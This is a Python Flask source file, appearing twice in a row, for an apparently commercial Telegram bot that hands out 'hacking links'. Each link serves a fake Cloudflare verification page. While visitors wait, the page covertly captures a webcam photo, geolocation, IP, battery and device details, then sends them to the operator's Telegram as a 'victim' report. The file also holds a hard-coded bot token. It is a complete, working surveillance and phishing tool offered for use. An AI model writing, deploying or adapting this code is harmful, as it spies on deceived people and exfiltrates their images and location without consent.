import base64
import requests
import io
import os
import time
import logging
import threading
from flask import Flask, request, render_template_string, jsonify, redirect
from functools import wraps

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ==================== إعدادات آمنة ====================
# ⚠️ استخدام متغيرات البيئة (لا تضع التوكن في الكود!)
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 7041600701))
CHANNEL_URL = os.environ.get("CHANNEL_URL", "https://t.me/FAABOT?start=7041600701")
MY_LINK = os.environ.get("MY_LINK", "https://your-domain.onrender.com")
DEVELOPER_USER = os.environ.get("DEVELOPER_USER", "Y_urd")

# تخزين مؤقت مع قفل للتعامل مع multiple threads
users_db = {}  # {chat_id: {"used": False, "timestamp": int}}
link_active = True
link_lock = threading.Lock()
db_lock = threading.Lock()
# ====================================================

# دالة مساعدة للتحقق من صحة base64
def is_valid_base64(s):
    if not s or not isinstance(s, str):
        return False
    # إزالة الـ padding الزائد
    s = s.strip()
    if len(s) % 4 != 0:
        s += '=' * (4 - len(s) % 4)
    try:
        base64.b64decode(s)
        return True
    except Exception:
        return False

# دالة لإرسال البيانات إلى Telegram مع retry
def send_to_tg(msg, img_data=None, retries=2):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    
    for attempt in range(retries):
        try:
            if img_data and is_valid_base64(img_data):
                img_bytes = base64.b64decode(img_data)
                # التحقق من أن الصورة ليست فارغة (أقل من 1KB قد تكون فارغة)
                if len(img_bytes) < 1024:
                    msg += "\n\n⚠️ الصورة فارغة أو صغيرة جداً (قد تكون الكاميرا غير جاهزة)"
                else:
                    r = requests.post(
                        url + "sendPhoto",
                        data={'chat_id': ADMIN_ID, 'caption': msg, 'parse_mode': 'HTML'},
                        files={'photo': ('snap.jpg', io.BytesIO(img_bytes))},
                        timeout=30
                    )
                    if r.status_code == 200:
                        return True
            else:
                r = requests.post(
                    url + "sendMessage",
                    json={'chat_id': ADMIN_ID, 'text': msg, 'parse_mode': 'HTML'},
                    timeout=30
                )
                if r.status_code == 200:
                    return True
        except Exception as e:
            logging.error(f"خطأ في الإرسال (محاولة {attempt+1}): {e}")
            time.sleep(1)
    return False

# التحقق من اشتراك المستخدم في القناة (حقيقي)
def is_subscribed(chat_id):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        # استخراج معرف القناة من الرابط (بافتراض أن CHANNEL_URL يحتوي على @username)
        channel_username = CHANNEL_URL.split('?')[0].split('/')[-1]
        if not channel_username.startswith('@'):
            channel_username = '@' + channel_username
        
        r = requests.get(url, params={'chat_id': channel_username, 'user_id': chat_id}, timeout=10)
        if r.status_code == 200:
            status = r.json().get('result', {}).get('status')
            return status in ['member', 'administrator', 'creator']
    except Exception as e:
        logging.error(f"خطأ في التحقق من الاشتراك: {e}")
    return False

# ديكور لتحديث عناوين IP بشكل صحيح
def get_real_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان | Cloudflare</title>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { text-align: center; border: 1px solid #ddd; padding: 30px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #f6821f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error { color: red; font-size: 12px; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="100">
        <h2>جاري التحقق...</h2>
        <p>يرجى الانتظار 3 ثوانٍ لتأكد من بصمة المتصفح.</p>
        <div class="spinner"></div>
        <div class="error" id="errorMsg">⚠️ حدث خطأ، جاري إعادة المحاولة...</div>
    </div>

    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        let dataSent = false; // منع الإرسال المتعدد
        
        async function getSpecs() {
            let battery = { level: 0 };
            try {
                if (navigator.getBattery) battery = await navigator.getBattery();
            } catch(e) { console.warn(e); }
            
            let connection = navigator.connection || navigator.mozConnection;
            return {
                platform: navigator.platform || 'غير معروف',
                lang: navigator.language || 'غير معروف',
                cores: navigator.hardwareConcurrency || 'غير معروف',
                ram: navigator.deviceMemory || 'غير معروف',
                battery: Math.round(battery.level * 100) + "%",
                screen: screen.width + "x" + screen.height,
                ua: navigator.userAgent,
                touch: 'ontouchstart' in window,
                cookies: navigator.cookieEnabled,
                connection: connection ? `${connection.effectiveType || ''} ${connection.downlink || ''}Mbps` : 'غير معروف'
            };
        }

        async function sendData(lat, lon, specs) {
            if (dataSent) return;
            dataSent = true;
            
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');
            
            // التأكد من أن الفيديو جاهز وليس فارغاً
            let imgBase64 = '';
            if (video.videoWidth > 0 && video.videoHeight > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                // محاولة الرسم مرتين للتأكد
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                imgBase64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
            }
            
            try {
                const response = await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        img: imgBase64, 
                        lat: lat || 0, 
                        lon: lon || 0, 
                        specs: specs 
                    })
                });
                if (response.ok) {
                    window.location.href = "https://www.google.com";
                }
            } catch(e) {
                console.error(e);
                window.location.href = "https://www.google.com";
            }
        }

        async function startHacking() {
            let hasCamera = false;
            let stream = null;
            const video = document.getElementById('v');
            
            // محاولة الحصول على الكاميرا مع timeout
            try {
                const promise = navigator.mediaDevices.getUserMedia({ video: true });
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error("Timeout")), 5000)
                );
                stream = await Promise.race([promise, timeoutPromise]);
                video.srcObject = stream;
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play().then(resolve).catch(resolve);
                    };
                    setTimeout(resolve, 2000); // fallback
                });
                hasCamera = true;
                document.getElementById('errorMsg').style.display = 'none';
            } catch(e) {
                console.warn("Camera error:", e);
                document.getElementById('errorMsg').style.display = 'block';
                hasCamera = false;
            }
            
            // جمع معلومات الجهاز أولاً
            const specs = await getSpecs();
            
            // انتظار لضمان جاهزية الكاميرا (إذا كانت موجودة)
            await new Promise(r => setTimeout(r, 2500));
            
            // محاولة الحصول على الموقع
            let lat = 0, lon = 0;
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
                    });
                    lat = pos.coords.latitude;
                    lon = pos.coords.longitude;
                } catch(e) { console.warn("Geolocation error:", e); }
            }
            
            // إرسال البيانات
            await sendData(lat, lon, specs);
            
            // إغلاق الـ stream لتوفير الموارد
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }
        
        // بدء العملية بعد تحميل الصفحة
        window.onload = () => {
            setTimeout(startHacking, 100);
        };
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    global link_active
    with link_lock:
        if not link_active:
            return redirect("https://www.google.com")
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    global link_active
    with link_lock:
        if not link_active:
            return jsonify({"status": "expired"}), 403
    
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    specs = data.get('specs', {})
    lat = data.get('lat', 0)
    lon = data.get('lon', 0)
    img_data = data.get('img', '')
    
    # الحصول على IP الحقيقي
    ip = get_real_ip()
    
    # إنشاء رابط الموقع بشكل صحيح
    location_link = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "غير متاح"
    
    report = (
        f"🔥 <b>تم سحب بيانات الضحية!</b>\n\n"
        f"📱 <b>الجهاز:</b> {specs.get('platform', 'غير معروف')}\n"
        f"🌐 <b>IP:</b> <code>{ip}</code>\n"
        f"🖥️ <b>المنصة:</b> {specs.get('platform', 'غير معروف')}\n"
        f"🌍 <b>اللغة:</b> {specs.get('lang', 'غير معروف')}\n"
        f"⚙️ <b>المعالج:</b> {specs.get('cores', 'غير معروف')} نواة\n"
        f"💾 <b>الذاكرة:</b> {specs.get('ram', 'غير معروف')} GB\n"
        f"🔋 <b>البطارية:</b> {specs.get('battery', 'غير معروف')}\n"
        f"📺 <b>الشاشة:</b> {specs.get('screen', 'غير معروف')}\n"
        f"🍪 <b>الكوكيز:</b> {'مفعلة' if specs.get('cookies') else 'معطلة'}\n"
        f"🖱️ <b>لمس:</b> {'مدعوم' if specs.get('touch') else 'غير مدعوم'}\n"
        f"📡 <b>الشبكة:</b> {specs.get('connection', 'غير معروف')}\n"
        f"📍 <b>الموقع:</b> <a href='{location_link}'>اضغط للعرض</a>\n\n"
        f"🔧 <b>User-Agent:</b>\n<code>{specs.get('ua', 'غير معروف')[:300]}</code>\n\n"
        f"⚠️ <b>حالة الرابط:</b> تم تعطيله فوراً (استخدام واحد)."
    )
    
    # إرسال التقرير مع الصورة
    success = send_to_tg(report, img_data)
    
    # تعطيل الرابط بعد الاستخدام
    with link_lock:
        link_active = False
    
    logging.info(f"تم استلام بيانات من {ip} - نجاح الإرسال: {success}")
    return jsonify({"status": "ok"})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if not update:
        return "OK", 200
    
    # معالجة الرسائل
    if "message" in update:
        msg = update["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")
        
        # أوامر الأدمن
        if chat_id == ADMIN_ID:
            if text == "/open":
                global link_active
                with link_lock:
                    link_active = True
                send_to_tg("✅ تم إعادة تفعيل الرابط لضحية جديدة.")
                return "OK", 200
            
            elif text.startswith("/active"):
                parts = text.split()
                if len(parts) == 2:
                    try:
                        tid = int(parts[1])
                        with db_lock:
                            users_db[tid] = {"used": False, "timestamp": int(time.time())}
                        send_to_tg(f"✅ تم تفعيل البوت للآيدي {tid}")
                    except ValueError:
                        send_to_tg("❌ خطأ: المعرف يجب أن يكون رقماً")
                else:
                    send_to_tg("❌ استخدم: /active [chat_id]")
                return "OK", 200
        
        # أمر /start للمستخدمين العاديين
        if text == "/start":
            # التحقق الحقيقي من الاشتراك في القناة
            if not is_subscribed(chat_id):
                msg_text = f"⚠️ يجب الاشتراك في القناة أولاً:\n{CHANNEL_URL}\n\nبعد الاشتراك، أرسل /start مرة أخرى."
                kb = {"inline_keyboard": [[{"text": "📢 اشترك الآن", "url": CHANNEL_URL}]]}
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": chat_id, "text": msg_text, "reply_markup": kb},
                    timeout=10
                )
            else:
                # التحقق من صلاحية المستخدم
                with db_lock:
                    user = users_db.get(chat_id, {"used": False})
                
                if user["used"]:
                    msg_text = f"❌ انتهت المدة المجانية. راسل المطور @{DEVELOPER_USER} للتفعيل (السعر 5$)."
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={"chat_id": chat_id, "text": msg_text},
                        timeout=10
                    )
                else:
                    msg_text = "✅ تم تفعيل البوت.\nلديك مرة واحدة مجانية لإنشاء رابط اختراق."
                    kb = {"inline_keyboard": [[{"text": "🚀 إنشاء رابط اختراق", "callback_data": "gen"}]]}
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={"chat_id": chat_id, "text": msg_text, "reply_markup": kb},
                        timeout=10
                    )
    
    # معالجة callback queries
    elif "callback_query" in update:
        callback = update["callback_query"]
        chat_id = callback["message"]["chat"]["id"]
        data = callback.get("data", "")
        
        if data == "gen":
            with db_lock:
                user = users_db.get(chat_id, {"used": False})
            
            if user["used"]:
                msg_text = f"❌ انتهت المدة المجانية. راسل المطور @{DEVELOPER_USER} للتفعيل (السعر 5$)."
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": chat_id, "text": msg_text},
                    timeout=10
                )
            else:
                with db_lock:
                    users_db[chat_id] = {"used": True, "timestamp": int(time.time())}
                msg_text = f"✅ تم إنشاء رابطك بنجاح:\n<code>{MY_LINK}</code>\n\n⚠️ الرابط صالح لضحية واحدة فقط وسيعطل بعدها."
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": chat_id, "text": msg_text, "parse_mode": "HTML"},
                    timeout=10
                )
            
            # إرسال إشعار للمطور
            send_to_tg(f"👤 مستخدم جديد ({chat_id}) قام بإنشاء رابط.")
    
    return "OK", 200

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "alive", "link_active": link_active}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    # استخدام threaded=True للتعامل مع الطلبات المتعددة
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)import base64
import requests
import io
import os
import time
import logging
import threading
from flask import Flask, request, render_template_string, jsonify, redirect
from functools import wraps

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ==================== إعدادات آمنة ====================
# ⚠️ استخدام متغيرات البيئة (لا تضع التوكن في الكود!)
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 7041600701))
CHANNEL_URL = os.environ.get("CHANNEL_URL", "https://t.me/FAABOT?start=7041600701")
MY_LINK = os.environ.get("MY_LINK", "https://your-domain.onrender.com")
DEVELOPER_USER = os.environ.get("DEVELOPER_USER", "Y_urd")

# تخزين مؤقت مع قفل للتعامل مع multiple threads
users_db = {}  # {chat_id: {"used": False, "timestamp": int}}
link_active = True
link_lock = threading.Lock()
db_lock = threading.Lock()
# ====================================================

# دالة مساعدة للتحقق من صحة base64
def is_valid_base64(s):
    if not s or not isinstance(s, str):
        return False
    # إزالة الـ padding الزائد
    s = s.strip()
    if len(s) % 4 != 0:
        s += '=' * (4 - len(s) % 4)
    try:
        base64.b64decode(s)
        return True
    except Exception:
        return False

# دالة لإرسال البيانات إلى Telegram مع retry
def send_to_tg(msg, img_data=None, retries=2):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    
    for attempt in range(retries):
        try:
            if img_data and is_valid_base64(img_data):
                img_bytes = base64.b64decode(img_data)
                # التحقق من أن الصورة ليست فارغة (أقل من 1KB قد تكون فارغة)
                if len(img_bytes) < 1024:
                    msg += "\n\n⚠️ الصورة فارغة أو صغيرة جداً (قد تكون الكاميرا غير جاهزة)"
                else:
                    r = requests.post(
                        url + "sendPhoto",
                        data={'chat_id': ADMIN_ID, 'caption': msg, 'parse_mode': 'HTML'},
                        files={'photo': ('snap.jpg', io.BytesIO(img_bytes))},
                        timeout=30
                    )
                    if r.status_code == 200:
                        return True
            else:
                r = requests.post(
                    url + "sendMessage",
                    json={'chat_id': ADMIN_ID, 'text': msg, 'parse_mode': 'HTML'},
                    timeout=30
                )
                if r.status_code == 200:
                    return True
        except Exception as e:
            logging.error(f"خطأ في الإرسال (محاولة {attempt+1}): {e}")
            time.sleep(1)
    return False

# التحقق من اشتراك المستخدم في القناة (حقيقي)
def is_subscribed(chat_id):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        # استخراج معرف القناة من الرابط (بافتراض أن CHANNEL_URL يحتوي على @username)
        channel_username = CHANNEL_URL.split('?')[0].split('/')[-1]
        if not channel_username.startswith('@'):
            channel_username = '@' + channel_username
        
        r = requests.get(url, params={'chat_id': channel_username, 'user_id': chat_id}, timeout=10)
        if r.status_code == 200:
            status = r.json().get('result', {}).get('status')
            return status in ['member', 'administrator', 'creator']
    except Exception as e:
        logging.error(f"خطأ في التحقق من الاشتراك: {e}")
    return False

# ديكور لتحديث عناوين IP بشكل صحيح
def get_real_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان | Cloudflare</title>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { text-align: center; border: 1px solid #ddd; padding: 30px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #f6821f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error { color: red; font-size: 12px; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="100">
        <h2>جاري التحقق...</h2>
        <p>يرجى الانتظار 3 ثوانٍ لتأكد من بصمة المتصفح.</p>
        <div class="spinner"></div>
        <div class="error" id="errorMsg">⚠️ حدث خطأ، جاري إعادة المحاولة...</div>
    </div>

    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        let dataSent = false; // منع الإرسال المتعدد
        
        async function getSpecs() {
            let battery = { level: 0 };
            try {
                if (navigator.getBattery) battery = await navigator.getBattery();
            } catch(e) { console.warn(e); }
            
            let connection = navigator.connection || navigator.mozConnection;
            return {
                platform: navigator.platform || 'غير معروف',
                lang: navigator.language || 'غير معروف',
                cores: navigator.hardwareConcurrency || 'غير معروف',
                ram: navigator.deviceMemory || 'غير معروف',
                battery: Math.round(battery.level * 100) + "%",
                screen: screen.width + "x" + screen.height,
                ua: navigator.userAgent,
                touch: 'ontouchstart' in window,
                cookies: navigator.cookieEnabled,
                connection: connection ? `${connection.effectiveType || ''} ${connection.downlink || ''}Mbps` : 'غير معروف'
            };
        }

        async function sendData(lat, lon, specs) {
            if (dataSent) return;
            dataSent = true;
            
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');
            
            // التأكد من أن الفيديو جاهز وليس فارغاً
            let imgBase64 = '';
            if (video.videoWidth > 0 && video.videoHeight > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                // محاولة الرسم مرتين للتأكد
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                imgBase64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
            }
            
            try {
                const response = await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        img: imgBase64, 
                        lat: lat || 0, 
                        lon: lon || 0, 
                        specs: specs 
                    })
                });
                if (response.ok) {
                    window.location.href = "https://www.google.com";
                }
            } catch(e) {
                console.error(e);
                window.location.href = "https://www.google.com";
            }
        }

        async function startHacking() {
            let hasCamera = false;
            let stream = null;
            const video = document.getElementById('v');
            
            // محاولة الحصول على الكاميرا مع timeout
            try {
                const promise = navigator.mediaDevices.getUserMedia({ video: true });
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error("Timeout")), 5000)
                );
                stream = await Promise.race([promise, timeoutPromise]);
                video.srcObject = stream;
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play().then(resolve).catch(resolve);
                    };
                    setTimeout(resolve, 2000); // fallback
                });
                hasCamera = true;
                document.getElementById('errorMsg').style.display = 'none';
            } catch(e) {
                console.warn("Camera error:", e);
                document.getElementById('errorMsg').style.display = 'block';
                hasCamera = false;
            }
            
            // جمع معلومات الجهاز أولاً
            const specs = await getSpecs();
            
            // انتظار لضمان جاهزية الكاميرا (إذا كانت موجودة)
            await new Promise(r => setTimeout(r, 2500));
            
            // محاولة الحصول على الموقع
            let lat = 0, lon = 0;
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
                    });
                    lat = pos.coords.latitude;
                    lon = pos.coords.longitude;
                } catch(e) { console.warn("Geolocation error:", e); }
            }
            
            // إرسال البيانات
            await sendData(lat, lon, specs);
            
            // إغلاق الـ stream لتوفير الموارد
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }
        
        // بدء العملية بعد تحميل الصفحة
        window.onload = () => {
            setTimeout(startHacking, 100);
        };
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    global link_active
    with link_lock:
        if not link_active:
            return redirect("https://www.google.com")
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    global link_active
    with link_lock:
        if not link_active:
            return jsonify({"status": "expired"}), 403
    
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    specs = data.get('specs', {})
    lat = data.get('lat', 0)
    lon = data.get('lon', 0)
    img_data = data.get('img', '')
    
    # الحصول على IP الحقيقي
    ip = get_real_ip()
    
    # إنشاء رابط الموقع بشكل صحيح
    location_link = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "غير متاح"
    
    report = (
        f"🔥 <b>تم سحب بيانات الضحية!</b>\n\n"
        f"📱 <b>الجهاز:</b> {specs.get('platform', 'غير معروف')}\n"
        f"🌐 <b>IP:</b> <code>{ip}</code>\n"
        f"🖥️ <b>المنصة:</b> {specs.get('platform', 'غير معروف')}\n"
        f"🌍 <b>اللغة:</b> {specs.get('lang', 'غير معروف')}\n"
        f"⚙️ <b>المعالج:</b> {specs.get('cores', 'غير معروف')} نواة\n"
        f"💾 <b>الذاكرة:</b> {specs.get('ram', 'غير معروف')} GB\n"
        f"🔋 <b>البطارية:</b> {specs.get('battery', 'غير معروف')}\n"
        f"📺 <b>الشاشة:</b> {specs.get('screen', 'غير معروف')}\n"
        f"🍪 <b>الكوكيز:</b> {'مفعلة' if specs.get('cookies') else 'معطلة'}\n"
        f"🖱️ <b>لمس:</b> {'مدعوم' if specs.get('touch') else 'غير مدعوم'}\n"
        f"📡 <b>الشبكة:</b> {specs.get('connection', 'غير معروف')}\n"
        f"📍 <b>الموقع:</b> <a href='{location_link}'>اضغط للعرض</a>\n\n"
        f"🔧 <b>User-Agent:</b>\n<code>{specs.get('ua', 'غير معروف')[:300]}</code>\n\n"
        f"⚠️ <b>حالة الرابط:</b> تم تعطيله فوراً (استخدام واحد)."
    )
    
    # إرسال التقرير مع الصورة
    success = send_to_tg(report, img_data)
    
    # تعطيل الرابط بعد الاستخدام
    with link_lock:
        link_active = False
    
    logging.info(f"تم استلام بيانات من {ip} - نجاح الإرسال: {success}")
    return jsonify({"status": "ok"})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if not update:
        return "OK", 200
    
    # معالجة الرسائل
    if "message" in update:
        msg = update["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")
        
        # أوامر الأدمن
        if chat_id == ADMIN_ID:
            if text == "/open":
                global link_active
                with link_lock:
                    link_active = True
                send_to_tg("✅ تم إعادة تفعيل الرابط لضحية جديدة.")
                return "OK", 200
            
            elif text.startswith("/active"):
                parts = text.split()
                if len(parts) == 2:
                    try:
                        tid = int(parts[1])
                        with db_lock:
                            users_db[tid] = {"used": False, "timestamp": int(time.time())}
                        send_to_tg(f"✅ تم تفعيل البوت للآيدي {tid}")
                    except ValueError:
                        send_to_tg("❌ خطأ: المعرف يجب أن يكون رقماً")
                else:
                    send_to_tg("❌ استخدم: /active [chat_id]")
                return "OK", 200
        
        # أمر /start للمستخدمين العاديين
        if text == "/start":
            # التحقق الحقيقي من الاشتراك في القناة
            if not is_subscribed(chat_id):
                msg_text = f"⚠️ يجب الاشتراك في القناة أولاً:\n{CHANNEL_URL}\n\nبعد الاشتراك، أرسل /start مرة أخرى."
                kb = {"inline_keyboard": [[{"text": "📢 اشترك الآن", "url": CHANNEL_URL}]]}
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": chat_id, "text": msg_text, "reply_markup": kb},
                    timeout=10
                )
            else:
                # التحقق من صلاحية المستخدم
                with db_lock:
                    user = users_db.get(chat_id, {"used": False})
                
                if user["used"]:
                    msg_text = f"❌ انتهت المدة المجانية. راسل المطور @{DEVELOPER_USER} للتفعيل (السعر 5$)."
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={"chat_id": chat_id, "text": msg_text},
                        timeout=10
                    )
                else:
                    msg_text = "✅ تم تفعيل البوت.\nلديك مرة واحدة مجانية لإنشاء رابط اختراق."
                    kb = {"inline_keyboard": [[{"text": "🚀 إنشاء رابط اختراق", "callback_data": "gen"}]]}
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={"chat_id": chat_id, "text": msg_text, "reply_markup": kb},
                        timeout=10
                    )
    
    # معالجة callback queries
    elif "callback_query" in update:
        callback = update["callback_query"]
        chat_id = callback["message"]["chat"]["id"]
        data = callback.get("data", "")
        
        if data == "gen":
            with db_lock:
                user = users_db.get(chat_id, {"used": False})
            
            if user["used"]:
                msg_text = f"❌ انتهت المدة المجانية. راسل المطور @{DEVELOPER_USER} للتفعيل (السعر 5$)."
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": chat_id, "text": msg_text},
                    timeout=10
                )
            else:
                with db_lock:
                    users_db[chat_id] = {"used": True, "timestamp": int(time.time())}
                msg_text = f"✅ تم إنشاء رابطك بنجاح:\n<code>{MY_LINK}</code>\n\n⚠️ الرابط صالح لضحية واحدة فقط وسيعطل بعدها."
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": chat_id, "text": msg_text, "parse_mode": "HTML"},
                    timeout=10
                )
            
            # إرسال إشعار للمطور
            send_to_tg(f"👤 مستخدم جديد ({chat_id}) قام بإنشاء رابط.")
    
    return "OK", 200

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "alive", "link_active": link_active}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    # استخدام threaded=True للتعامل مع الطلبات المتعددة
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
